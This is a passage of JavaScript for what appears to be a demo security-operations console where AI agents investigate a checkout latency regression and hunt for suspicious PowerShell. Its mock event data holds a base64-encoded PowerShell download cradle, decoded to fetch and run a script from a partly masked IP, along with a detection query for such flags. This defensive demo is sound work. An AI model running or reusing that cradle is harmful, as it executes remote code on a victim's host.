  if(ev){ const r=ev.currentTarget.getBoundingClientRect(); x=r.right-224; y=r.bottom+6; }
  else { const r=$('#composerInput').getBoundingClientRect(); x=r.left; y=r.top-140; }
  pop.style.left=Math.max(8,Math.min(x,window.innerWidth-240))+'px'; pop.style.top=y+'px';
  const unwire=()=>{ document.removeEventListener('mousedown',close); document.removeEventListener('scroll',closeScroll,true); };
  const close=(e)=>{ if(!pop.contains(e.target)){ pop.remove(); unwire(); } };
  const closeScroll=(e)=>{ if(e && e.target && pop.contains(e.target)) return; pop.remove(); unwire(); };
  setTimeout(()=>{ document.addEventListener('mousedown',close); document.addEventListener('scroll',closeScroll,true); },50);
}
function startInvite(ev){ peoplePicker(ev, doInvite, curThread().assignees); }
function doInvite(pid){
  const t=curThread();
  if((t.assignees||[]).indexOf(pid)>=0){ toast('info','Already in the thread',`${PEOPLE[pid].name} is already here.`); return; }
  const first=(t.assignees||[]).length===0;
  if(!t.assignees) t.assignees=[];
  t.assignees.push(pid);
  renderSpine();
  pushMsg({role:'system',evt:'join',text:`${PEOPLE[pid].name} was added to the conversation`});
  toast('ok',`${PEOPLE[pid].name} invited`,'They can see the full thread and reply here.');
  if(first){ setTimeout(()=>{ pushMsg({role:'agent',prose:`Added <b>${PEOPLE[pid].name}</b> to the thread — they see the whole conversation so far, nothing to re-explain. If we promote this later, they carry over as collaborators automatically.`}); },550); }
}
function startAssign(ev){ peoplePicker(ev, doAssign, curThread().assignees); }
function doAssign(pid){
  const t=curThread();
  if(t.assignees.indexOf(pid)<0) t.assignees.push(pid);
  if(t.status==='open') t.status='in-progress';
  t.timeline.push({time:nowHM(),cls:'',txt:`<b>Assigned to ${PEOPLE[pid].name}</b>`});
  // also mention tom for flavor when assigning maya
  let mentionTxt='';
  if(pid==='maya' && t.mentions.indexOf('tom')<0){ t.mentions.push('tom'); mentionTxt=' and looped in Tom Okafor'; t.timeline.push({time:nowHM(),cls:'',txt:`<b>@Tom Okafor</b> mentioned`}); }
  state.inspectorTab='people'; renderSpine(); renderInspector();
  regenBrief(t,'Assigned to '+PEOPLE[pid].name);
  pushMsg({role:'system',evt:'assign',text:`Assigned to ${PEOPLE[pid].name}${mentionTxt}`});
  toast('ok',`Assigned to ${PEOPLE[pid].name}`,`${mentionTxt?'+ Tom Okafor mentioned · ':''}They inherit the full thread`);
  setTimeout(()=>{ pushMsg({role:'agent',prose:`Assigned to <b>${PEOPLE[pid].name}</b>${mentionTxt}. They'll open this and see the entire investigation — our queries, the evidence, the timeline, the actions taken — not just a summary. Nothing to re-explain.`});
    setSuggestions([{label:"Convert to Incident",icon:'siren',fn:()=>startAction('incident')},{label:"Done for now",icon:'check',fn:()=>clearSuggestions()}]);
  },650);
}

/* ============================================================ NIGHTSHIFT (inverse) staging */
function stageNight(){
  const t=state.threads['night-1'];
  if(t._staged) return;
  t._staged=true;
  t.messages=[
    {role:'system',evt:'nightopen',text:'NightShift opened this investigation · 02:14 UTC — SLO burn detected'},
    {role:'agent',agent:'nightshift',prose:`I detected the <b>checkout-service</b> p99 latency climbing from 180ms to 520ms over 12 minutes — breaching the 300ms SLO. I started investigating autonomously.`},
    {role:'agent',agent:'nightshift',name:false,tool:{icon:'trace',label:'APM · trace latency breakdown',
      query:'service:"checkout-service"  span.duration p99  window 30m',
      result:`<table class="res"><tr><th>Span</th><th>Was</th><th>Now</th><th>Δ</th></tr>
      <tr><td class="mono">checkout.handler</td><td class="mono">158ms</td><td class="mono">178ms</td><td class="mono">+20ms</td></tr>
      <tr><td class="mono" style="color:var(--red-d)">db.query GetCart</td><td class="mono">22ms</td><td class="mono" style="color:var(--red-d)">360ms</td><td class="mono" style="color:var(--red-d)">+338ms</td></tr>
      <tr><td class="mono">render</td><td class="mono">12ms</td><td class="mono">14ms</td><td class="mono">+2ms</td></tr></table>`}},
    {role:'agent',agent:'nightshift',name:false,prose:`The regression is almost entirely in one database span: <b>GetCart</b> went from 22ms to 360ms. Checking what changed.`},
    {role:'agent',agent:'nightshift',name:false,tool:{icon:'deploy',label:'Deploys + repo diff · checkout-service',
      query:'service:"checkout-service"  deploys  window 1h',
      result:`<div class="res-stat"><div class="stat"><div class="v">v2.8.1</div><div class="k">deployed 02:02 UTC</div></div><div class="stat"><div class="v amber">12 min</div><div class="k">before regression</div></div></div>
      <div class="snap" style="margin-top:10px;font-family:var(--mono)">- query.hint("idx_cart_user")   <span style="color:var(--red-d)">// removed in v2.8.1</span><br>→ full table scan on carts (1.2M rows)</div>`}},
    {role:'agent',agent:'nightshift',name:false,prose:`Root cause confirmed: <b>v2.8.1</b> removed an index hint on the GetCart query, forcing a full table scan. I've assembled this into an investigation with all four artifacts and a timeline. <b>My proposed remediation is a rollback to v2.8.0</b> — here it is for your approval:`},
    {role:'agent',agent:'nightshift',name:false,action:{kind:'rollback'}},
  ];
  t.evidence=JSON.parse(JSON.stringify(NIGHT_EVIDENCE));
  t.timeline=JSON.parse(JSON.stringify(NIGHT_TIMELINE));
  t.actions=[{kind:'rollback',title:'Roll back checkout → v2.8.0',sub:'Proposed by NightShift',time:'02:27',by:'nightshift',status:'proposed'}];
  t.isNightCase=true; /* the official checkout-service investigation — rollback fallbacks apply only here */
  t.narrative=NIGHT_NARRATIVE;
  // seed the brief — NightShift authored the root cause overnight
  t.situation=`At 02:14 UTC, NightShift detected checkout-service p99 latency climbing from 180ms to 520ms, breaching the 300ms SLO. Tracing isolated the regression to a single database span — GetCart — which jumped from 22ms to 360ms. A deploy of v2.8.1 twelve minutes earlier removed an index hint on that query, forcing a full table scan over 1.2M rows. NightShift assembled the evidence and proposed a rollback to v2.8.0, now awaiting your review.`;
  t.questions=['Will re-adding the index hint require a schema migration, or is it query-only?','Did any other query lose an index hint in the same v2.8.1 change?','Should v2.8.1 be blocked from redeploy until the hint is restored?'];
  t.assessment='Checkout p99 regression root-caused to v2.8.1 removing a query index hint. Rollback to v2.8.0 proposed, awaiting review.'; t.assessmentTone='info';
  t.hypotheses=[{id:'h-root',statement:`v2.8.1's removal of the GetCart index hint caused the p99 regression by forcing a full table scan on the carts table.`,author:'nightshift',state:'confirmed',confidence:'high',forIds:['ev-trace','ev-diff','ev-deploy'],againstIds:[],actions:[{label:'Roll back to v2.8.0',kind:'rollback',gated:true}]}];
}
function adoptInvestigation(){
  const t=state.threads['night-1'];
  t.status='open'; if(t.assignees.indexOf('you')<0) t.assignees.push('you');
  t.timeline.push({time:nowHM(),cls:'now',txt:'<b>Adopted by you</b> — now an official investigation'});
  renderNav();renderSpine();renderInspector();
  regenBrief(t,'Adopted as official investigation');
  pushMsg({role:'system',evt:'adopt',text:'Investigation adopted — you are now co-owner'});
  toast('ok','Investigation adopted','You own it alongside NightShift');
  clearSuggestions();
  setTimeout(()=>pushMsg({role:'agent',agent:'nightshift',prose:`Adopted. You're co-owner now — same record NightShift opened overnight, no recreation. I'll keep monitoring and hand you anything new.`}),500);
}

/* ============================================================ POWERSHELL HUNT + EVENTS + FLYOUT */
const PS_EVENTS=[
  { risk:'high', time:'02:41:09', host:'FIN-WS-04', user:'svc-backup',
    cmd:'powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAE4AZQB3…',
    why:'Encoded command decoding to a remote download cradle — executed by a non-interactive service account on an out-of-scope host.',
    kv:[['event.action','process_creation'],['@timestamp','today · 02:41:09 UTC'],['host.name','FIN-WS-04'],['user.name','svc-backup'],['process.pid','4912'],['parent.process','services.exe (684)'],['event.outcome','success']],
    cmdFull:'powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA…',
    decoded:"IEX (New-Object Net.WebClient).DownloadString('http://45.137.x.x/a.ps1')",
    lineage:'services.exe (684) → powershell.exe (4912)',
    network:'→ 45.137.x.x:443 · outbound · no prior history',
    mitre:['T1059.001 PowerShell','T1071.001 Web protocols (C2)'] },
  { risk:'low', time:'08:14:22', host:'FIN-WS-11', user:'admin.jdoe',
    cmd:'powershell.exe Get-EventLog -LogName Security -Newest 50',
    why:null,
    kv:[['event.action','process_creation'],['@timestamp','today · 08:14:22 UTC'],['host.name','FIN-WS-11'],['user.name','admin.jdoe'],['process.pid','7720'],['parent.process','explorer.exe'],['event.outcome','success']],
    cmdFull:'powershell.exe Get-EventLog -LogName Security -Newest 50',
    decoded:null, lineage:'explorer.exe → powershell.exe (7720)', network:null, mitre:null },
  { risk:'low', time:'01:00:03', host:'BKP-02', user:'svc-backup',
    cmd:'powershell.exe -File C:\\backup\\nightly.ps1',
    why:null,
    kv:[['event.action','process_creation'],['@timestamp','today · 01:00:03 UTC'],['host.name','BKP-02'],['user.name','svc-backup'],['process.pid','3310'],['parent.process','taskeng.exe (scheduled)'],['event.outcome','success']],
    cmdFull:'powershell.exe -ExecutionPolicy Bypass -File C:\\backup\\nightly.ps1',
    decoded:null, lineage:'taskeng.exe → powershell.exe (3310)', network:null, mitre:null },
  { risk:'medium', time:'06:32:50', host:'FIN-WS-02', user:'admin.kpatel',
    cmd:'powershell.exe -w hidden -Command Update-Help -Force',
    why:'Hidden-window flag is common tradecraft, but the command itself (Update-Help) is benign.',
    kv:[['event.action','process_creation'],['@timestamp','today · 06:32:50 UTC'],['host.name','FIN-WS-02'],['user.name','admin.kpatel'],['process.pid','5128'],['parent.process','powershell.exe (console)'],['event.outcome','success']],
    cmdFull:'powershell.exe -w hidden -Command Update-Help -Force',
    decoded:null, lineage:'powershell.exe → powershell.exe (5128)', network:null, mitre:['T1564.003 Hidden Window'] },
  { risk:'low', time:'05:48:11', host:'WEB-03', user:'svc-deploy',
    cmd:'powershell.exe Invoke-WebRequest -Uri https://repo.internal/…',
    why:null,
    kv:[['event.action','process_creation'],['@timestamp','today · 05:48:11 UTC'],['host.name','WEB-03'],['user.name','svc-deploy'],['process.pid','9004'],['parent.process','agent.exe (ci)'],['event.outcome','success']],
    cmdFull:'powershell.exe Invoke-WebRequest -Uri https://repo.internal/deploy.ps1 -OutFile deploy.ps1',
    decoded:null, lineage:'agent.exe → powershell.exe (9004)', network:'→ repo.internal:443 · known host', mitre:null },
];
function riskColor(r){ return r==='high'?'var(--red-d)':r==='medium'?'var(--amber)':'var(--ink-3)'; }
function riskBg(r){ return r==='high'?'var(--red-bg)':r==='medium'?'var(--amber-bg)':'var(--bg-2)'; }

function huntPowerShell(){
  pushMsg({role:'user',text:'Hunt for suspicious PowerShell across the fleet.'});
  thinking('Scanning process telemetry for suspicious PowerShell across all hosts…',()=>{
    pushMsg({role:'agent',tool:{icon:'terminal',label:'Endpoint · PowerShell process hunt',
      query:'process.name:"powershell.exe" AND\n(process.args:"-enc" OR process.args:"-w hidden" OR process.args:"DownloadString")  window 24h',
      result:`<div class="res-stat">
        <div class="stat"><div class="v">5</div><div class="k">executions</div></div>
        <div class="stat"><div class="v">5</div><div class="k">hosts</div></div>
        <div class="stat"><div class="v red">1</div><div class="k">high-risk</div></div>
      </div>
      <button class="view-events-btn" onclick="App.showEvents()">${ic('terminal',13)} View 5 matching events</button>`}});
    pushMsg({role:'agent',name:false,prose:`Most are routine admin and backup scripts, but one stands out: an <b>encoded download cradle</b> on <b>FIN-WS-04</b> run by the <code>svc-backup</code> service account. Open the events to inspect them.`});
    setSuggestions([
      {label:"Investigate FIN-WS-04",icon:'host',act:true,fn:()=>nextDay("Something's clearly wrong on FIN-WS-04 — show me the full picture.")},
    ]);
  },850);
}
function showEvents(){ pushMsg({role:'agent',name:false,events:true}); }

function eventsTable(){
  let rows='';
  const RISK_RANK={high:0,medium:1,low:2};
  PS_EVENTS.map((e,i)=>({e,i})).sort((a,b)=>(RISK_RANK[a.e.risk]-RISK_RANK[b.e.risk])||String(a.e.time).localeCompare(String(b.e.time))).forEach(({e,i})=>{
    rows+=`<tr class="ev-row ${e.risk==='high'?'flag':''}" onclick="App.openEventFlyout(${i})">
      <td><span class="risk-pill" style="color:${riskColor(e.risk)};background:${riskBg(e.risk)}">${e.risk}</span></td>
      <td class="mono">${e.time}</td>
      <td class="mono">${e.host}</td>
      <td class="mono">${e.user}</td>
      <td class="mono evcmd">${e.cmd}</td>
      <td class="evchev">${ic('arrow',13)}</td>
    </tr>`;
  });
  return `<div class="events-card">
    <div class="events-h">${ic('terminal',13)} <b>5 PowerShell executions</b> across 5 hosts <span class="ev-hint">— click a row to inspect</span><button class="discover-link" onclick="App.viewInDiscover()">${ic('compass',13)} View in Discover ${ic('arrow',11)}</button></div>
    <div class="ev-scroll"><table class="ev-table">
      <thead><tr><th>Risk</th><th>Time</th><th>Host</th><th>User</th><th>Command</th><th></th></tr></thead>
      <tbody>${rows}</tbody></table></div>
  </div>`;
}
function flyoutHTML(e){
  let kv='';
  e.kv.forEach(([k,v])=>{ kv+=`<div class="fly-kv"><span class="fk">${k}</span><span class="fv">${v}</span></div>`; });
  let mitre='';
  if(e.mitre){ e.mitre.forEach(m=>mitre+=`<span class="mtag">${m}</span>`); }
  return `<div class="fly-h">
      <div class="fly-htext"><div class="fly-eyebrow">Event detail · process_creation</div>
      <div class="fly-title">${ic('terminal',16)} powershell.exe</div></div>
      <span class="risk-pill lg" style="color:${riskColor(e.risk)};background:${riskBg(e.risk)}">${e.risk} risk</span>
      <button class="fly-close" onclick="App.closeFlyout()">${ic('x',16)}</button>
    </div>
    <div class="fly-body">
      ${e.why?`<div class="fly-why"><span class="fwi">${ic('warn',14)}</span><div><b>Why this surfaced</b>${e.why}</div></div>`:''}
      <div class="fly-sec"><h5>Fields</h5><div class="fly-kvs">${kv}</div></div>
      <div class="fly-sec"><h5>Command line</h5><div class="fly-code">${e.cmdFull}</div></div>
      ${e.decoded?`<div class="fly-sec"><h5>Decoded command <span class="dec-tag">base64</span></h5><div class="fly-code decoded">${e.decoded}</div></div>`:''}
      <div class="fly-sec"><h5>Process lineage</h5><div class="fly-lineage mono">${e.lineage}</div></div>
      ${e.network?`<div class="fly-sec"><h5>Network</h5><div class="fly-net mono ${e.risk==='high'?'bad':''}">${ic('network',13)} ${e.network}</div></div>`:''}
      ${e.mitre?`<div class="fly-sec"><h5>MITRE ATT&CK</h5><div class="minitags">${mitre}</div></div>`:''}
    </div>`;
}
function openEventFlyout(i){
  const e=PS_EVENTS[i];
  document.getElementById('flyoutContent').innerHTML=flyoutHTML(e);
  document.getElementById('flyout').classList.add('open');
  document.getElementById('flyoutBackdrop').classList.add('open');
}
function closeFlyout(){
  document.getElementById('flyout').classList.remove('open');
  document.getElementById('flyoutBackdrop').classList.remove('open');
}

/* ============================================================ BRIEF: dynamic Overview document */
const HYPO_STATE={investigating:{label:'Investigating',cls:'inv'},supported:{label:'Supported',cls:'sup'},confirmed:{label:'Confirmed',cls:'conf'},refuted:{label:'Refuted',cls:'ref'}};
function initBrief(t){ if(!t.brief) t.brief={versions:[],pending:0,pendingLabels:[],generating:false,viewing:null}; if(!t.hypotheses) t.hypotheses=[]; }
function nowHM(){ const d=new Date(); return String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0'); }
function timeAgo(ts){ const s=Math.floor((Date.now()-ts)/1000); if(s<8)return 'just now'; if(s<60)return s+'s ago'; const m=Math.floor(s/60); if(m<60)return m+'m ago'; const h=Math.floor(m/60); if(h<24)return h+'h ago'; return Math.floor(h/24)+'d ago'; }

/* the two-clock update engine */
function regenBrief(t,label){
  initBrief(t);
  if(t.brief.generating){ if(label) t.brief.pendingLabels.push(label); return; }
  t.brief.generating=true;
  refreshBriefView(t);
  const dur=2000+Math.random()*1100;
  setTimeout(()=>{
    const html=buildBrief(t);
    const v=(t.brief.versions.length?t.brief.versions[t.brief.versions.length-1].v:0)+1;
    t.brief.versions.push({v,ts:Date.now(),label,html});
    t.brief.pending=0; t.brief.pendingLabels=[]; t.brief.generating=false; t.brief.viewing=null;
    refreshBriefView(t,true);
  },dur);
}
function markBriefStale(t,label){ initBrief(t); if(t.brief.generating) return; t.brief.pending++; if(label) t.brief.pendingLabels.push(label); refreshBriefView(t); }
function refreshBriefView(t,flash){
  if(curThread()!==t) return;
  if(!(state.inspectorOpen && state.activeApp==='object' && (state.inspectorTab||'overview')==='overview')) return;
  renderInspector();
  if(flash){ const d=document.getElementById('briefDoc'); if(d){ d.classList.add('flash'); setTimeout(()=>{ const x=document.getElementById('briefDoc'); if(x) x.classList.remove('flash'); },1250); } }
}

/* header + chrome (rendered around the document body) */
function briefHeader(t){
  const bs=t.brief; const latest=bs.versions[bs.versions.length-1];
  const v=latest?latest.v:1; let status;
  if(bs.generating) status=`<span class="bf-dot gen"></span><span class="bf-state">Updating brief…</span>`;
  else if(bs.pending>0) status=`<span class="bf-dot stale"></span><span class="bf-state">v${v} · ${bs.pending} update${bs.pending>1?'s':''} pending</span>`;
  else status=`<span class="bf-dot live"></span><span class="bf-state">v${v} · updated ${latest?timeAgo(latest.ts):'now'}</span>`;
  const ver = bs.versions.length>1 ? `<button class="bf-ver" onclick="App.toggleBriefVersions(event)">${ic('clock',13)} History</button>` : '';
  const upd = bs.generating ? '' : `<button class="bf-update ${bs.pending>0?'hot':''}" onclick="App.updateBrief()">${ic('refresh',13)} Update</button>`;
  return `<div class="brief-head"><div class="bf-status">${status}</div><div class="bf-tools">${ver}${upd}</div></div>`;
}
function assessmentSection(t){
  const bs=t.brief; const latest=bs.versions[bs.versions.length-1];
  const v=latest?latest.v:1; let dotCls, fresh;
  if(bs.generating){ dotCls='gen'; fresh='Updating…'; }
  else if(bs.pending>0){ dotCls='stale'; fresh=`v${v} · ${bs.pending} update${bs.pending>1?'s':''} pending`; }
  else { dotCls='live'; fresh=`v${v} · updated ${latest?timeAgo(latest.ts):'now'}`; }
  const ver = bs.versions.length>1 ? `<button class="bf-ver" onclick="App.toggleBriefVersions(event)">${ic('clock',13)} History</button>` : '';
  const upd = bs.generating ? '' : `<button class="bf-update ${bs.pending>0?'hot':''}" onclick="App.updateBrief()">${ic('refresh',13)} Update</button>`;
  const a=briefAssessment(t); const co=briefCallout(t);
  return `<section class="bsec brief-assess-sec">
    <div class="bsec-h">
      <div class="bf-status"><h4>Assessment</h4><span class="bf-dot ${dotCls}"></span><span class="bf-fresh">${fresh}</span></div>
      <div class="bf-tools">${ver}${upd}</div>
    </div>
    <div class="brief-assess ${a.tone}"><span class="ba-mark"></span>${a.text}</div>
    <div class="brief-callout ${co.tone}">${ic(co.icon,15)}<span>${co.text}</span></div>
  </section>`;
}
function openBriefVersions(anchor){
  closeBriefVersions(); const t=curThread(); const bs=t.brief; if(!bs) return;
  const menu=el(`<div class="bf-vers-menu" id="bfVers"></div>`);
  const last=bs.versions.length-1; const cur=bs.viewing==null?last:bs.viewing;
  [...bs.versions].reverse().forEach((ver,ri)=>{ const idx=last-ri; const isLatest=idx===last;
    const row=el(`<button class="bfv-row ${cur===idx?'on':''}"><span class="bfv-v">v${ver.v}${isLatest?' · latest':''}</span><span class="bfv-l">${ver.label}</span><span class="bfv-t">${timeAgo(ver.ts)}</span></button>`);
    row.onclick=()=>{ closeBriefVersions(); App.viewBriefVersion(isLatest?null:idx); };
    menu.appendChild(row);
  });
  document.body.appendChild(menu);
  const r=anchor.getBoundingClientRect(); menu.style.top=(r.bottom+6)+'px'; menu.style.left=Math.max(8,Math.min(r.right-260,window.innerWidth-272))+'px';
  setTimeout(()=>document.addEventListener('mousedown',bfVersClose),40);
}
function bfVersClose(e){ const m=$('#bfVers'); if(m&&!m.contains(e.target)) closeBriefVersions(); }
function closeBriefVersions(){ const m=$('#bfVers'); if(m) m.remove(); document.removeEventListener('mousedown',bfVersClose); }

/* the document body — generated from live state */
function evById(t,id){ return (t.evidence||[]).find(e=>e.id===id); }
function shortSrc(src){ return (src||'').split('·')[0].trim()||'source'; }
function buildBrief(t){
  const phase = (t.status==='resolved'||t.status==='auto-resolved') ? 'resolved' : 'live';
  const a=briefAssessment(t); const co=briefCallout(t);
  const situation = t.situation || t.narrative || 'Investigation in progress.';
  let chain=''; (t.timeline||[]).forEach(r=>{ chain+=`<div class="bchain-step ${r.cls||''}"><span class="bcs-time mono">${r.time}</span><span class="bcs-txt">${r.txt}</span></div>`; });
  // key findings = evidence not yet claimed by any hypothesis (de-dupes against the hypotheses board)
  const claimed=new Set(); (t.hypotheses||[]).forEach(h=>{ (h.forIds||[]).concat(h.againstIds||[]).forEach(id=>claimed.add(id)); });
  let finds=''; (t.evidence||[]).filter(e=>!(e.id&&claimed.has(e.id))).slice(0,4).forEach((e,i)=>{ finds+=`<li class="bfind" onclick="App.gotoEvidence('${e.id||''}')"><span class="bfind-n">${i+1}</span><div><div class="bfind-t">${e.t}</div><div class="bfind-w">${e.why||(e.snap||'').split('\n')[0]}</div></div></li>`; });
  const hasHypo=(t.hypotheses||[]).length>0;
  const hypoBoard=buildHypoBoard(t); const acts=buildRecActions(t);
  const qs=(t.qa?t.qa.filter(x=>!x.answered).map(x=>x.q):(t.questions||defaultQuestions(t))); let ql=''; qs.forEach(q=>ql+=`<li>${q}</li>`);

  const assess=`<div class="brief-assess ${a.tone}"><span class="ba-mark"></span>${a.text}</div>`;
  const callout=`<div class="brief-callout ${co.tone}">${ic(co.icon,15)}<span>${co.text}</span></div>`;
  void assess; void callout;
  const sitSec=`<section class="bsec"><h4>Situation</h4><p class="bnarr">${situation}</p></section>`;
  const chainSec=chain?`<section class="bsec"><h4>How it unfolded</h4><div class="bchain">${chain}</div></section>`:'';
  const findsSec=finds?`<section class="bsec"><div class="bsec-h"><h4>Key findings</h4><span class="bsec-x" onclick="App.gotoEvidence()">View evidence →</span></div><ul class="bfinds">${finds}</ul></section>`:'';
  const hypoSec = (phase==='live' || hasHypo)
    ? `<section class="bsec"><div class="bsec-h"><h4>${phase==='resolved'?'Conclusion':'Hypotheses'}</h4>${phase==='resolved'?'':`<button class="brief-add" onclick="App.formHypothesis()">${ic('plus',13)} Hypothesis</button>`}</div>${hypoBoard}</section>`
    : '';
  const actsSec=acts?`<section class="bsec"><h4>Recommended next steps</h4><div class="brec">${acts}</div></section>`:'';
  let ansL=''; (t.qa?(t.answered||[]):[]).forEach(a=>{ const qy=(t.qa.find(x=>x.id===a.id)||{}); const ev=evById(t,a.evId); ansL+=`<li><span class="bq-a-q">${ic('check',12)} ${qy.q||a.q||''}</span>${ev?`<button class="cite-tag sm" onclick="App.gotoEvidence('${a.evId}')">${ic('link',11)} ${shortSrc(ev.src)} ${ic('arrow',10)}</button>`:''}</li>`; });
  const qSec=(ql?`<section class="bsec"><h4>${phase==='resolved'?'Follow-ups':'Open questions'}</h4><ul class="bq">${ql}</ul></section>`:'')+(ansL?`<section class="bsec"><h4>Answered</h4><ul class="bq answered">${ansL}</ul></section>`:'');
  const mitreSec=t.mitre?`<section class="bsec"><h4>MITRE ATT&CK</h4><div class="minitags">${t.mitre.map(x=>`<span class="mtag">${x}</span>`).join('')}</div></section>`:'';
  const divider=lbl=>`<div class="brief-divider"><span>${lbl}</span></div>`;

  if(phase==='resolved'){
    // narrative-first: the record is the durable artifact; reasoning becomes outcome
    const head=[sitSec].filter(Boolean).join('');
    const auto = t.autoResolved ? autoResolutionSec(t) : '';
    const rec=[chainSec, t.autoResolved?'':findsSec].filter(Boolean).join('');
    const out=[hypoSec,qSec,mitreSec].filter(Boolean).join('');
    const closer = t.autoResolved ? `<section class="bsec"><h4>Next steps</h4><p class="bnarr" style="margin-bottom:10px">Every recommended step was carried out autonomously — nothing is pending. You can discuss the resolution or archive the record.</p><div class="brec"><button class="brec-btn" onclick="App.openThread('${t.id}')">${ic('comment',12)} Discuss in chat<span class="brec-x">${ic('arrow',12)}</span></button><button class="brec-btn" onclick="App.archiveRecord('${t.id}')">${ic('folder',12)} Archive record<span class="brec-x">${ic('arrow',12)}</span></button></div></section>` : '';
    return head + (auto?divider('How it was resolved')+auto:'') + (rec?divider('Investigation record')+rec:'') + (hypoSec?divider('Outcome')+out:out) + closer;
  }
  // live: decision core sits high (reasoning → the actions it generates); record below the divider
  const core=[sitSec,hypoSec,actsSec].filter(Boolean).join('');
  const rec=[chainSec,findsSec,qSec,mitreSec].filter(Boolean).join('');
  return core + (rec?divider('Investigation record')+rec:'');
}
function briefAssessment(t){
  if(t.assessment) return {text:t.assessment, tone:t.assessmentTone||'warn'};
  const first=(t.narrative||'').replace(/<[^>]+>/g,'').split('. ')[0];
  const tone = t.status==='resolved'?'ok':(t.status==='awaiting'?'info':((t.status==='in-progress'||t.status==='contained')?'info':'warn'));
  return {text:(first||'Investigation in progress')+'.', tone};
}
function briefCallout(t){
  if(t.callout) return t.callout;
  if(t.status==='resolved'||t.status==='auto-resolved'){
    if(t.autoResolved||t.status==='auto-resolved') return {tone:'ok',icon:'check',text:`Resolved autonomously — every step ran inside your allow-list. Record retained for review.`};
    return {tone:'ok',icon:'check',text:t.mode==='dayshift'?`Resolved — threat contained and remediated. Record retained for reference.`:`Resolved — root cause addressed and service is healthy.`};
  }
  const taken=new Set((t.actions||[]).filter(a=>a.status!=='proposed').map(a=>a.kind));
  if(t.mode==='dayshift'){
    if(t.isDayCase){
      if(taken.has('disable')||taken.has('isolate')){ const b=[]; if(taken.has('isolate'))b.push('FIN-WS-04 isolated'); if(taken.has('disable'))b.push('svc-backup disabled'); return {tone:'ok',icon:'check',text:`Contained — ${b.join(' · ')}. Monitoring for residual activity.`}; }
      if((t.hypotheses||[]).some(h=>h.state==='confirmed')) return {tone:'crit',icon:'warn',text:`Confirmed live intrusion and still not contained — svc-backup is enabled and FIN-WS-04 is online. Contain now.`};
      return {tone:'warn',icon:'warn',text:`Not yet contained — svc-backup is still enabled and FIN-WS-04 remains online. Containment recommended.`};
    }
    /* generic records speak for themselves — never borrow the official case's hosts or accounts */
    if(t.status==='contained') return {tone:'ok',icon:'check',text:`Contained — monitoring for residual activity.`};
    if(t.status==='in-progress'){ const lbl=(AI_RADAR[t.id]||{}).progressLabel; return {tone:'info',icon:'clock',text:`In motion — NotDaybreak is executing${lbl?` (${lbl})`:''}. Gated controls stay available while it runs.`}; }
    const dec=decisionOf(t);
    if(dec==='monitor') return {tone:'info',icon:'clock',text:`Watching — no action needed now. You'll be flagged the moment anything changes.`};
    if(dec==='dismiss') return {tone:'info',icon:'check',text:`Likely benign — recommended move is to dismiss and keep the record.`};
    return {tone:'warn',icon:'warn',text:`Awaiting your decision — the recommended move is staged below.`};
  } else {
    if(t.isNightCase){
      if(taken.has('rollback')) return {tone:'ok',icon:'check',text:`Rollback executed — checkout-service on v2.8.0, p99 recovering toward 180ms.`};
      return {tone:'info',icon:'sparkle',text:`Root cause identified by NightShift overnight. A rollback to v2.8.0 is proposed and awaiting your review.`};
    }
    if(t.status==='in-progress'){ const lbl=(AI_RADAR[t.id]||{}).progressLabel; return {tone:'info',icon:'clock',text:`In motion — NightShift is executing${lbl?` (${lbl})`:''}.`}; }
    const dec=decisionOf(t);
    if(dec==='monitor') return {tone:'info',icon:'clock',text:`Watching — no action needed now. You'll be flagged the moment anything changes.`};
    if(dec==='dismiss') return {tone:'info',icon:'check',text:`Likely benign — recommended move is to dismiss and keep the record.`};
    return {tone:'warn',icon:'warn',text:`Awaiting your decision — the recommended move is staged below.`};
  }
}
function defaultQuestions(t){
  const official=t.mode==='dayshift'?t.isDayCase:t.isNightCase;
  if(!official) return []; /* stubs get no borrowed questions — an empty section is more honest than the wrong one */
  return t.mode==='dayshift'?['What is the blast radius beyond the affected host?','How were the credentials obtained?']:['What is the customer-facing impact window?','Can the fix ship forward instead of rolling back?'];
}
const HSTATE_ICON={investigating:'investigation',supported:'check',confirmed:'check',refuted:'x'};
function confMeterLevel(c){ return {forming:1,low:1,moderate:2,high:3}[c]||1; }
function hypoAuthor(id){
  if(id==='nightshift') return `<span class="hypo-auth agent">${ic('moon',12)} NightShift</span>`;
  const p=PEOPLE[id]; const name=p?p.name.split(' ')[0]:'You';
  return `<span class="hypo-auth">${avatar(id)} ${name}</span>`;
}
function hypoEvRows(t,ids){
  let rows='';
  (ids||[]).forEach(id=>{ const e=evById(t,id);
    if(e){ rows+=`<li class="hev-item" onclick="App.gotoEvidence('${id}')"><span class="hev-ic">${ic(e.icon||'db',13)}</span><span class="hev-t">${e.t}</span><span class="hev-src">${shortSrc(e.src)}</span><span class="hev-go">${ic('arrow',13)}</span></li>`; }
    else { rows+=`<li class="hev-item plain">${id}</li>`; }
  });
  return rows;
}
function buildHypoBoard(t){
  if(!t.hypotheses||!t.hypotheses.length) return `<div class="hypo-empty">No hypotheses yet. <button class="link-btn" onclick="App.formHypothesis()">Form one</button> to direct the investigation — the agent gathers evidence for and against, then suggests next steps.</div>`;
  let h='';
  t.hypotheses.forEach(hy=>{ const st=HYPO_STATE[hy.state]||HYPO_STATE.investigating;
    const sIcon=HSTATE_ICON[hy.state]||'investigation'; const lvl=confMeterLevel(hy.confidence);
    let ev='';
    if(hy.forIds&&hy.forIds.length){ ev+=`<div class="hev for"><div class="hev-h"><span class="hev-h-l">Supporting evidence</span><span class="hev-h-n">${hy.forIds.length}</span></div><ul>${hypoEvRows(t,hy.forIds)}</ul></div>`; }
    if(hy.againstIds&&hy.againstIds.length){ ev+=`<div class="hev against"><div class="hev-h"><span class="hev-h-l">Counter-evidence</span><span class="hev-h-n">${hy.againstIds.length}</span></div><ul>${hypoEvRows(t,hy.againstIds)}</ul></div>`; }
    let acts=''; if(hy.actions&&hy.actions.length){ acts=`<div class="hypo-acts">${hy.actions.map(ac=>`<button class="hact ${ac.gated?'gated':''}" onclick="App.hypoAction('${ac.kind}')">${ic(ac.gated?'lock':'bolt',11)} ${ac.label}</button>`).join('')}</div>`; }
